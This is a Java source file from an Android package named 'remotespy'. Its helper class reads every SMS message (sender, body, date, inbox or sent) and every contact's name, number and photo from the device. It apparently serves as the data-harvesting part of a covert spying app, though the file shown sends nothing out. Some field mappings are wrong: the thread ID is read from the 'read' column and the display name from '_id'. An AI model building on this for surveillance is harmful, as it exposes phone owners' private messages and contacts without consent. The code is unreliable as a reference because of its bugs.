package org.dalol.remotespy;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

/**
 * @author Filippo Engidashet [filippo.eng@gmail.com]
 * @version 1.0.0
 * @since Sunday, 25/03/2018 at 03:17.
 */
public class MessagesHelper {

    public ArrayList<Sms> getAllSms(Context context) {

        Log.e("apps", "here ");
        ArrayList<Sms> lstSms = new ArrayList<Sms>();
        Sms objSms = new Sms();
        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = context.getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        //mcontext.startManagingCursor(c);
        int totalSMS = c.getCount();
        Log.e("apps else", totalSMS + " total");
        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                String v = Telephony.Sms.SUBJECT;

                objSms = new Sms();
                objSms.displayName = c.getString(c.getColumnIndexOrThrow("_id"));
                objSms.address = c.getString(c.getColumnIndexOrThrow("address"));
                objSms.msg = c.getString(c.getColumnIndexOrThrow("body"));
                objSms.threadId = c.getString(c.getColumnIndex("read"));
                objSms.date = c.getString(c.getColumnIndexOrThrow("date"));
                objSms.isRead = c.getInt(c.getColumnIndexOrThrow("read")) == 1;
                objSms.subject = c.getString(c.getColumnIndexOrThrow("subject"));
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSms.type = "inbox";
                } else {
                    objSms.type = "sent";
                }

                lstSms.add(objSms);

                c.moveToNext();
            }
        }
        // else {
        // throw new RuntimeException("You have no SMS");
        // }
        c.close();
        Log.e("apps", lstSms.size() + "");
        return lstSms;
    }


    public List<ContacT> fetchContacts(Context context) {

        List<ContacT> contacTS = new LinkedList<>();

        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.HAS_PHONE_NUMBER,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.Contacts.PHOTO_THUMBNAIL_URI};


        String _ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
        String DISPLAY_NAME = Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB ? ContactsContract.Contacts.DISPLAY_NAME_PRIMARY : ContactsContract.Contacts.DISPLAY_NAME;
        String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
        String THUMBNAIL = ContactsContract.Contacts.PHOTO_THUMBNAIL_URI;

        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection, ContactsContract.CommonDataKinds.Phone.HAS_PHONE_NUMBER + "=?", new String[]{"1"},
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);

        System.out.println("contact size.." + cursor.getCount());

        if (cursor.getCount() > 0) {
            while (cursor.moveToNext()) {

                String contact_id = cursor.getString(cursor.getColumnIndex(_ID));
                String name = cursor.getString(cursor.getColumnIndex(DISPLAY_NAME));
                String phoneNumber = cursor.getString(cursor.getColumnIndex(NUMBER));
                String photothumb = cursor .getString(cursor.getColumnIndex(THUMBNAIL));

                ContacT contacT = new ContacT();
                contacT.id = contact_id;
                contacT.name = name;
                contacT.number = phoneNumber;
                contacT.photothumb = photothumb;

                contacTS.add(contacT);


//                System.out.println(" name : " + name);
//                System.out.println(" number : " + phoneNumber);

            }
        }
        return contacTS;
    }
}
